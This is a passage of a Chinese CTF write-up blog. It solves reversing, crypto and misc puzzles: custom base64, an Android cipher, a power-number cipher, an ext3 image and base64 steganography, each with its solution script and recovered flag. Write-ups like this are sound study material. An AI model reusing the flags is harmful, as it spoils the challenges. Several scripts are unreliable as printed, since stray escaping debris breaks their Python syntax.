class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义加密表</span></span><br><span class="line"><span class="comment">#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;#原版</span></span><br><span class="line">s = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span><span class="comment">#自定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">nums = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line"><span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">temp_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">temp_str_list.append(<span class="built_in">int</span>(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line"><span class="comment">#print(temp_str_list)</span></span><br><span class="line"><span class="keyword">if</span> nums:</span><br><span class="line">temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">outputs += s[i]</span><br><span class="line">bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">print(<span class="string">&quot;Encrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line">temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 补足8位字节</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line"><span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">bin_str = bin_str[<span class="number">4</span>:]</span><br><span class="line">print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">My_base64_decode(input_str)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     *************************************</span><br><span class="line">     *    (1)encode         (2)decode    *</span><br><span class="line">     *************************************</span><br><span class="line"></span><br><span class="line">Please select the operation you want to perform:</span><br><span class="line">2</span><br><span class="line">Please enter a string that needs to be decrypted:</span><br><span class="line">QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br><span class="line">Decrypted String:</span><br><span class="line">flag&#123;实践出真知这不是flag&#125;</span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：手撕算法</strong></p><blockquote><p>部分函数名已重命名，懒得再找一份原题QAQ</p></blockquote><p>开门见山，mainactivity 就能找到加密算法入口。函数将输入值剔除<code>flag&#123;&#125;</code> ，然后传入加密函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title">b</span><span class="params">(String string)</span> </span>&#123;  <span class="comment">// 结尾&#125;</span></span><br><span class="line">    Boolean result;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!string.startsWith(<span class="string">&quot;flag&#123;&quot;</span>)) &#123;  <span class="comment">// 开头flag&#123;</span></span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!string.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        String string_1 = string.substring(<span class="number">5</span>, string.length() - <span class="number">1</span>);  <span class="comment">// 分割字符串去除flag&#123;&#125;</span></span><br><span class="line">        Mb v4 = <span class="keyword">new</span> Mb(Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">        Ma v5 = <span class="keyword">new</span> Ma(Integer.valueOf(<span class="number">3</span>));</span><br><span class="line">        StringBuilder c_string = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; string_1.length()) &#123;</span><br><span class="line">            c_string.append(MainActivity.a(string_1.charAt(index) + <span class="string">&quot;&quot;</span>, v4, v5));<span class="comment">//加密函数</span></span><br><span class="line">            Integer v6 = Integer.valueOf(v4.b().intValue() / <span class="number">25</span>);</span><br><span class="line">            <span class="keyword">if</span>(v6.intValue() &gt; v1 &amp;&amp; v6.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                ++v1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = Boolean.valueOf(c_string.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密函数有两层最后调用为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(String string, Mb b, Ma a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.a(b.a(string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a b 加密逻辑大致一样，处理对象都是单字符，进行混淆后，对密钥进行更新。</p><p>b 加密函数主要如下：（忽略处理空格和字符不存在情况）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Mb.key_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">a</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    Integer v1 = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(Mb.key_list.contains(string.toLowerCase())) &#123;  <span class="comment">// 转为小写，然后查询在不在key中</span></span><br><span class="line">        Integer index = Integer.valueOf(Mb.key_list.indexOf(string));</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; Mb.a_ArrayList.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Mb.a_ArrayList.get(v0) == index) &#123;</span><br><span class="line">                v1 = Integer.valueOf(v0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">…………</span><br><span class="line">Mb.a();</span><br><span class="line"><span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密操作为：检索字符在<code>keylisit</code>的下标，记为<code>index</code>，然后检索<code>index</code>在<code>a_ArrayList</code>的下标，记为<code>v1</code>，检索成功就调用<code>Mb.a()</code>生成新的密钥<code>keylist</code>和<code>a_ArrayList</code>，然后返回<code>v1</code>。</p><p><code>a_ArrayList</code>不是一个静态变量，是经由<code>public Mb(Integer arg9)</code>生成的，一开始以为动态生成的，然后动态调试了一下，发现是第一次调用时生成好了，后续字符加密沿用上一字符密钥。生成的偏移为 2 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-18PsopqjCVDDdny8.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-cyfmgGJeWshDBKLi.png"></p><p><code>Mb.a()</code>处理逻辑就是：每一轮加密完成后，将两个密钥的首元素放置到最后一位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = Mb.a_ArrayList.get(<span class="number">0</span>).intValue();</span><br><span class="line">    Mb.a_ArrayList.remove(<span class="number">0</span>);</span><br><span class="line">    Mb.a_ArrayList.add(Integer.valueOf(v0));  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.key_list = Mb.key_list + <span class="string">&quot;&quot;</span> + Mb.key_list.charAt(<span class="number">0</span>);</span><br><span class="line">    Mb.key_list = Mb.key_list.substring(<span class="number">1</span>, <span class="number">27</span>);  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.d = Integer.valueOf(Mb.d.intValue() + <span class="number">1</span>);  <span class="comment">// 某个计算位加1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>a.a(b.a(string))</code> b 函数加密完成后，返回值作为参数传入 a ，加密方式与 b 相近，较大不同点是每轮加密不会随机化密钥，密钥初始偏移为 3 。因为从最后判断函数可知 flag 中间字符为 12 位，不足以触发 a 随机化密钥函数要求。</p><p>解密EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque <span class="comment"># 双端队列简化随机密钥实现</span></span><br><span class="line">alpha = deque(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>) </span><br><span class="line"><span class="comment">#key_b = deque([8, 25, 17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13]) </span></span><br><span class="line"><span class="comment">#key_a = deque([7, 14, 16, 21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8])</span></span><br><span class="line">key_b = deque([<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>])</span><br><span class="line">key_a = deque([<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>])</span><br><span class="line">c = <span class="string">&#x27;wigwrkaugala&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span> </span><br><span class="line">    i = key_a[(<span class="built_in">ord</span>(s) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))]</span><br><span class="line">    i = key_b[(i)] </span><br><span class="line">    print(alpha[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key_b.append(key_b.popleft()) </span><br><span class="line">    alpha.append(alpha.popleft())</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> c: decode(s)</span><br><span class="line">print(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>提交 flag 后看评论区好像题目有多解。</p></blockquote><p>[/collapse]</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>给出文本：<code>8842101220480224404014224202480122</code>。查看资料后，得出 0 是分解符。分界后各个数字相加后 -1 为与 A 的 ascii 码偏移。（ps：怎么感觉有点像是 8421 码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密字符</span></span><br><span class="line">c = <span class="string">&#x27;;8842101220480224404014224202480122&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">c</span>):</span></span><br><span class="line">c = c.split(<span class="string">&#x27;;0&#x27;</span>;)<span class="comment">#分割</span></span><br><span class="line">print(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">a += <span class="built_in">int</span>(j)</span><br><span class="line">print(<span class="built_in">chr</span>(a+<span class="built_in">ord</span>(<span class="string">&#x27;;A&#x27;</span>;)-<span class="number">1</span>),end=<span class="string">&#x27;;&#x27;</span>;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;;__main__&#x27;</span>;:</span><br><span class="line">decode(c)</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>题目提示是 Linux 系统镜像，首先反应是内存取证，然后使用 volatility 无法挂载。于是另寻方法，发现使用 IDA 32 位能成功打开，然后是查找字符串 shift+f12 ，因为内存镜像中的字符串也是可以被 IDA 读取的。加载字符串后，搜索 flag 发现 flag.txt 文件地址： O7avZhikgKgbF/flag.txt 。</p><p>然后就是怎么提取文件，正常情况下是用 volatility dump 命令，问题是现在加载不了。我采取用将其挂载到 Linux 虚拟机上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建挂载文件夹</span><br><span class="line">mkdir ext3</span><br><span class="line">#挂载</span><br><span class="line">mount f1fc23f5c743425d9e0073887c846d23 ext3</span><br><span class="line">#取消挂载</span><br><span class="line"><span class="meta">#umount ext3</span></span><br><span class="line">cat O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure><p>当然也可以不用 IDA 分析，直接挂载后搜索 <code>find / -name flag.txt</code></p><p>[/collapse]</p><h3 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>base64 隐写题目。隐写原理来自<a href="https://www.tr0y.wang/2017/06/14/Base64steg/">tr0y</a>：</p><p>隐写原理<br>注意红色的 0, 我们在解码的时候将其丢弃了, 所以这里的值不会影响解码. 所以我们可以在这进行隐写.<br>为什么等号的那部分 0 不能用于隐写? 因为修改那里的二进制值会导致等号数量变化, 解码的第 1 步会受影响. 自然也就破坏了源字符串.<br>而红色部分的 0 是作为最后一个字符二进制的组成部分, 还原时只用到了最后一个字符二进制的前部分, 后面的部分就不会影响还原.<br>唯一的影响就是最后一个字符会变化. 如下图</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315111022.png"></p><p>如果你直接解密’VHIweQ==’与’VHIweR==’, 得到的结果都是’Tr0y’.</p><p>当然, 一行 base64 顶多能有 2 个等号, 也就是有 2*2 位的可隐写位. 所以我们得弄很多行, 才能隐藏一个字符串, 这也是为什么题目给了一大段 base64 的原因.<br>接下来, 把要隐藏的 flag 转为 8 位二进制, 塞进去就行了.</p><p>加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = <span class="string">&#x27;;Tr0y&#123;Base64isF4n&#125;&#x27;</span>; <span class="comment">#flag</span></span><br><span class="line">bin_str = <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;;0b&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;0.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f0, <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;wb&#x27;</span>;) <span class="keyword">as</span> f1: <span class="comment">#&#x27;;0.txt&#x27;;是明文, &#x27;;1.txt&#x27;;用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">&#x27;;\n&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">&#x27;;=&#x27;</span>;)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> <span class="built_in">len</span>(bin_str):</span><br><span class="line">            offset = <span class="built_in">int</span>(<span class="string">&#x27;;0b&#x27;</span>;+bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[<span class="built_in">len</span>(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum*<span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">&#x27;;\n&#x27;</span>;)</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;;&#x27;</span>;.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;;&#x27;</span>;.join(stegb64.decode(<span class="string">&#x27;;base64&#x27;</span>;).encode(<span class="string">&#x27;;base64&#x27;</span>;).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;;=&#x27;</span>;) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>分组字节流查询字符串 flag.txt 发现有结果</p><p><img 